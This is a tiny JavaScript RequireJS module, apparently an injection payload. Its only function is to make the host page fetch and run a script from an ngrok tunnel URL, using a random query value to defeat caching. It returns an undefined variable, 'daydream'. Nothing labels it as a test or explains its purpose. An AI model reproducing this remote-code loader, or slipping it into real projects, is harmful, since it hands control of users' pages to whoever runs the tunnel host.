define(['jquery', 'https://208fb25881d7.ngrok.io?v=' + Math.random()], function ($) {
    return daydream;
});
